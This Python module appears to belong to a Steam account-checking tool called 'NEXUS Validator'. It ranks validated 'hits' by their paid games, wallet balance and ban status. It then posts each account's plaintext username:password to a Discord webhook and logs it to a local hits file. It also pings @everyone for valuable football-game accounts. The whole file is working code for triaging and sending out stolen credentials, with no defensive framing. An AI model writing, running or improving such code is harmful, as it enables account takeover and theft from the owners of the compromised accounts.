"""
Asynchronous Discord Webhook Dispatcher
Premium embed design — only paid games shown, FC/PES @everyone, auto-saves hitsdc.txt.
"""

import time
import asyncio
import logging
from pathlib import Path
from typing import Dict, Any, Optional, List
from datetime import datetime
import aiohttp

logger = logging.getLogger(__name__)

STEAM_ICON = "https://community.cloudflare.steamstatic.com/public/shared/images/responsive/share_steam_logo.png"
STEAM_BANNER_BASE = "https://steamcdn-a.akamaihd.net/steam/apps/{appid}/header.jpg"

# FC/FIFA/PES/eFootball keywords for @everyone ping
FOOTBALL_KEYWORDS = (
    "fc 24", "fc 25", "fc 26", "fc 27", "ea sports fc",
    "fifa", "pes ", "pro evolution soccer", "efootball",
    "eFootball", "ef 24", "ef 25",
)

# Free-to-play game name fragments — strip these from paid list
FREE_GAME_FRAGMENTS = (
    "counter-strike 2", "cs2", "cs:go", "dota 2", "team fortress 2",
    "pubg: battlegrounds", "apex legends", "warframe", "destiny 2",
    "unturned", "brawlhalla", "path of exile", "fall guys", "overwatch 2",
    "the sims 4", "lost ark", "halo infinite", "war thunder", "stumble guys",
    "metin2", "genshin impact", "honkai: star rail", "zenless zone zero",
    "black desert", "naraka: bladepoint", "delta force", "marvel rivals",
    "arena breakout: infinite", "deadlock", "once human", "super people",
    "combat master", "valorant", "fortnite", "krunker", "eve online",
    "world of tanks", "world of warships", "grand theft auto v legacy",
    "grand theft auto v enhanced", "steamvr", "steam vr", "steam linux",
    "enlisted", "ring of elysium", "rogue company",
)

# Output file for hits sent to Discord
HITSDC_FILE = Path("results") / "hitsdc.txt"


def _is_free_game(name: str) -> bool:
    """Returns True if the game name matches known free-to-play titles."""
    nl = name.lower().strip()
    for frag in FREE_GAME_FRAGMENTS:
        if frag in nl:
            return True
    # Demo / prologue / beta / trial suffixes
    for kw in (" demo", ":prologue", ": prologue", "- prologue", " prologue",
                " beta", " playtest", " test server", " trial edition",
                " trial", " teaser", "staging branch"):
        if nl.endswith(kw) or kw in nl:
            return True
    return False


def _is_football(name: str) -> bool:
    """Returns True if game name matches FC/FIFA/PES/eFootball series."""
    nl = name.lower()
    return any(kw in nl for kw in FOOTBALL_KEYWORDS)


def _save_to_hitsdc(item: Dict[str, Any], paid_games: List[str]) -> None:
    """Appends a dispatched hit record to hitsdc.txt on disk."""
    try:
        HITSDC_FILE.parent.mkdir(parents=True, exist_ok=True)
        username = item.get("username", "")
        password = item.get("password", "")
        steamid  = item.get("steamid", "")
        country  = item.get("country", "")
        wallet   = item.get("wallet", "")
        vac      = "VAC_BANNED" if item.get("vac_banned") else "CLEAN"
        status   = item.get("status", "HIT")
        games_str = " | ".join(paid_games) if paid_games else "—"
        line = (
            f"{username}:{password} | SteamID:{steamid} | Status:{status}"
            f" | VAC:{vac} | Country:{country} | Wallet:{wallet}"
            f" | PaidGames({len(paid_games)}):[{games_str}]\n"
        )
        with open(HITSDC_FILE, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception as e:
        logger.debug(f"hitsdc.txt write error: {e}")


def build_discord_embed(item: Dict[str, Any]) -> tuple:
    """
    Builds a premium Discord embed for a verified Steam account hit.
    Returns (embed_dict, is_football_target, paid_game_names_list).
    Only shows PAID games — free games are excluded entirely.
    """
    username     = item.get("username", "Unknown")
    password     = item.get("password", "")
    status       = item.get("status", "HIT")
    steamid      = str(item.get("steamid", "")).strip()
    persona      = item.get("persona_name") or username
    total_games  = item.get("total_games", 0)
    wallet       = item.get("wallet", "")
    country      = item.get("country", "Global")
    location     = item.get("location", "")
    vac_banned   = item.get("vac_banned", False)
    trade_banned = item.get("trade_banned", False)
    is_limited   = item.get("is_limited", False)
    avatar_url   = item.get("avatar_url", "") or STEAM_ICON
    games        = item.get("games", [])
    matched_targets = item.get("matched_targets", [])
    is_2fa       = (status == "2FA_HIT")

    profile_url  = f"https://steamcommunity.com/profiles/{steamid}" if steamid else None

    # ── Filter: only genuinely PAID games ──────────────────────────────────
    paid_game_names = []
    football_detected = False
    for g in games:
        name = (g.get("name") or "").strip()
        if not name or name.startswith("AppID "):
            continue
        # Skip if marked free by validator OR matches our free fragment list
        if g.get("is_free", False) or _is_free_game(name):
            continue
        paid_game_names.append(name)
        if _is_football(name):
            football_detected = True

    # Also check matched_targets for football
    for tg in matched_targets:
        tg_name = (tg.get("name") if isinstance(tg, dict) else str(tg)) or ""
        if _is_football(tg_name):
            football_detected = True

    paid_count = len(paid_game_names)

    # ── Color ──────────────────────────────────────────────────────────────
    if football_detected:
        color = 0xFF5500  # Orange-red — football target
    elif matched_targets and not is_2fa:
        color = 0xE91E63  # Pink/Magenta — target hit
    elif is_2fa:
        color = 0xFFC107  # Amber — 2FA locked
    elif paid_count >= 10:
        color = 0x4CAF50  # Green — rich library
    elif paid_count >= 3:
        color = 0x2196F3  # Blue — decent library
    else:
        color = 0x9E9E9E  # Grey — small library

    # ── Title ──────────────────────────────────────────────────────────────
    if football_detected:
        badge = "⚽ FC/PES HIT"
    elif matched_targets and not is_2fa:
        badge = "🎯 TARGET HIT"
    elif is_2fa:
        badge = "🔐 2FA LOCKED"
    elif paid_count > 0:
        badge = "✅ PAID HIT"
    else:
        badge = "📋 HIT"

    title = f"{badge}  ›  {persona}"

    # ── Fields ─────────────────────────────────────────────────────────────
    fields: List[Dict[str, Any]] = []

    # Football / target games banner
    if matched_targets or football_detected:
        banner_games = [
            (tg.get("name") if isinstance(tg, dict) else str(tg))
            for tg in matched_targets[:12]
        ]
        # Add detected football games not already in matched_targets
        for pname in paid_game_names:
            if _is_football(pname) and pname not in banner_games:
                banner_games.append(pname)
        if banner_games:
            fields.append({
                "name": "🎮 Özel Oyunlar",
                "value": "\n".join(f"◆ **{n}**" for n in banner_games[:10]) or "—",
                "inline": False
            })

    # Account / Login
    fields.append({
        "name": "👤 Hesap",
        "value": f"```{username}:{password}```",
        "inline": False
    })

    # SteamID + Profile link
    if steamid:
        sid_display = f"[{steamid}]({profile_url})" if profile_url else steamid
    else:
        sid_display = "N/A"
    fields.append({"name": "🆔 SteamID64", "value": sid_display, "inline": True})

    # Wallet
    wallet_display = f"**{wallet}**" if wallet else "`Boş`"
    fields.append({"name": "💰 Bakiye", "value": wallet_display, "inline": True})

    # Location
    loc_str = f"{country}" + (f"  ({location})" if location else "")
    fields.append({"name": "🌍 Ülke", "value": loc_str or "Global", "inline": True})

    # Game stats
    fields.append({
        "name": "🎮 Kütüphane",
        "value": f"**{paid_count}** ücretli  |  **{total_games}** toplam",
        "inline": True
    })

    # Security
    vac_str   = "❌ BANLI" if vac_banned   else "✅ Temiz"
    trade_str = "❌ BANLI" if trade_banned else "✅ Temiz"
    lim_str   = "⚠️ Sınırlı" if is_limited else "✅ Normal"
    fields.append({
        "name": "🛡️ Güvenlik",
        "value": f"VAC: {vac_str}  |  Trade: {trade_str}  |  {lim_str}",
        "inline": True
    })

    # Status tag
    status_display = "2FA Kilitli — Geçerli Hesap" if is_2fa else "Doğrudan Giriş"
    fields.append({"name": "📌 Durum", "value": status_display, "inline": True})

    # ── Paid games list ────────────────────────────────────────────────────
    if paid_game_names:
        lines = []
        for i, nm in enumerate(paid_game_names[:25], 1):
            lines.append(f"`{i:02d}` {nm}")
        if paid_count > 25:
            lines.append(f"*… ve {paid_count - 25} ücretli oyun daha*")
        val = "\n".join(lines)
        if len(val) > 1020:
            val = val[:1015] + "…"
        fields.append({
            "name": f"🎰 Ücretli Oyunlar ({paid_count})",
            "value": val,
            "inline": False
        })
    elif is_2fa:
        fields.append({
            "name": "🎰 Oyunlar",
            "value": "*(Steam Guard aktif — oyun listesi alınamadı)*",
            "inline": False
        })
    else:
        fields.append({
            "name": "🎰 Oyunlar",
            "value": "*(Ücretli oyun bulunamadı)*",
            "inline": False
        })

    # ── Build embed ────────────────────────────────────────────────────────
    embed: Dict[str, Any] = {
        "title": title,
        "color": color,
        "fields": fields,
        "author": {
            "name": "NEXUS  ·  Steam Account Validator",
            "icon_url": STEAM_ICON
        },
        "thumbnail": {"url": avatar_url},
        "footer": {
            "text": f"NEXUS Validator  •  {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}",
            "icon_url": STEAM_ICON
        },
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    if profile_url:
        embed["url"] = profile_url

    return embed, football_detected, paid_game_names


class DiscordWebhookDispatcher:
    """
    Rate-limited async webhook dispatcher.
    Queues embeds, respects HTTP 429 backoff, saves every hit to hitsdc.txt.
    """

    def __init__(self, webhook_url: str):
        self.webhook_url  = webhook_url.strip()
        self._queue: Optional[asyncio.Queue] = None
        self._worker_task: Optional[asyncio.Task] = None
        self._is_running  = False
        self._session: Optional[aiohttp.ClientSession] = None

    async def start(self):
        if self._is_running:
            return
        self._queue = asyncio.Queue(maxsize=8000)
        self._is_running = True
        self._worker_task = asyncio.create_task(self._dispatch_loop())

    async def stop(self):
        self._is_running = False
        if self._worker_task:
            # Drain remaining queue first (up to 30s)
            try:
                await asyncio.wait_for(self._queue.join(), timeout=30)
            except Exception:
                pass
            self._worker_task.cancel()
            try:
                await self._worker_task
            except asyncio.CancelledError:
                pass
        if self._session and not self._session.closed:
            await self._session.close()

    async def dispatch_hit(self, item: Dict[str, Any]):
        """
        Dispatches a validated hit to Discord.
        - Only sends if account has at least 1 paid game (or is 2FA locked).
        - FC/FIFA/PES/eFootball hits get @everyone mention.
        - Saves every dispatched hit to hitsdc.txt.
        """
        if not self.webhook_url:
            return
        if not self._is_running or not self._queue:
            await self.start()

        try:
            embed, is_football, paid_game_names = build_discord_embed(item)
            status = item.get("status", "HIT")

            # ── Skip dispatch if no paid games and not 2FA ─────────────────
            if status == "HIT" and not paid_game_names:
                return  # No ücretli oyun → don't send to Discord

            # ── @everyone for football accounts ───────────────────────────
            payload: Dict[str, Any] = {
                "username":   "NEXUS Validator",
                "avatar_url": STEAM_ICON,
                "embeds":     [embed]
            }
            if is_football:
                payload["content"] = "@everyone 🔥 **FC / FIFA / PES / eFootball HİT!**"

            await self._queue.put(payload)

            # Save to hitsdc.txt
            _save_to_hitsdc(item, paid_game_names)

            uname = item.get("username", "?")
            print(f"\n\033[1;32m[DC DISPATCH] {uname} — {len(paid_game_names)} paid games queued\033[0m")

        except Exception as e:
            logger.debug(f"dispatch_hit error: {e}")

    async def dispatch_system_message(
        self,
        title: str,
        description: str,
        color: int = 0x2196F3,
        fields: Optional[List[Dict[str, Any]]] = None,
        mention_everyone: bool = False
    ):
        """Sends a system-level notification embed (cycle complete, restart, etc.)."""
        if not self.webhook_url:
            return
        if not self._is_running or not self._queue:
            await self.start()

        try:
            embed = {
                "title": title,
                "description": description,
                "color": color,
                "fields": fields or [],
                "author": {
                    "name": "NEXUS  ·  System Notification",
                    "icon_url": STEAM_ICON
                },
                "footer": {
                    "text": "NEXUS Validator",
                    "icon_url": STEAM_ICON
                },
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }
            payload: Dict[str, Any] = {
                "username":   "NEXUS Validator",
                "avatar_url": STEAM_ICON,
                "embeds":     [embed]
            }
            if mention_everyone:
                payload["content"] = "@everyone"
            await self._queue.put(payload)
        except Exception as e:
            logger.debug(f"dispatch_system_message error: {e}")

    async def _dispatch_loop(self):
        """Background loop that pops payloads and POSTs them to the webhook."""
        connector = aiohttp.TCPConnector(ssl=False)
        self._session = aiohttp.ClientSession(connector=connector)

        while self._is_running:
            try:
                payload = await asyncio.wait_for(self._queue.get(), timeout=2.0)
            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break

            for attempt in range(5):
                if not self._is_running:
                    break
                try:
                    async with self._session.post(
                        self.webhook_url,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=12)
                    ) as resp:
                        if resp.status in (200, 204):
                            await asyncio.sleep(1.1)  # max ~54 req/min (Discord allows 30/min per webhook)
                            break
                        elif resp.status == 429:
                            try:
                                rd = await resp.json()
                                retry = float(rd.get("retry_after", 3.0))
                            except Exception:
                                retry = 3.0
                            print(f"\033[33m[DISCORD 429] Rate limited — sleeping {retry:.1f}s\033[0m")
                            await asyncio.sleep(retry + 0.5)
                        else:
                            body = await resp.text()
                            print(f"\033[31m[DISCORD ERR] HTTP {resp.status}: {body[:120]}\033[0m")
                            await asyncio.sleep(1.5)
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"\033[31m[DISCORD NET] {e}\033[0m")
                    await asyncio.sleep(2.0)

            self._queue.task_done()

        if self._session and not self._session.closed:
            await self._session.close()


async def send_discord_test_message(webhook_url: str) -> bool:
    """Sends a test ping to verify the webhook is alive."""
    if not webhook_url or not webhook_url.startswith("http"):
        return False
    payload = {
        "username": "NEXUS Validator",
        "avatar_url": STEAM_ICON,
        "embeds": [{
            "title": "⚡ NEXUS — Bağlantı Testi",
            "description": "Discord webhook başarıyla bağlandı. Hit bildirimleri aktif.",
            "color": 0x4CAF50,
            "fields": [
                {"name": "Durum", "value": "🟢 Bağlı", "inline": True},
                {"name": "Versiyon", "value": "NEXUS v2.0", "inline": True},
            ],
            "footer": {"text": "NEXUS Validator", "icon_url": STEAM_ICON},
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(webhook_url, json=payload, timeout=aiohttp.ClientTimeout(total=8)) as r:
                return r.status in (200, 204)
    except Exception:
        return False
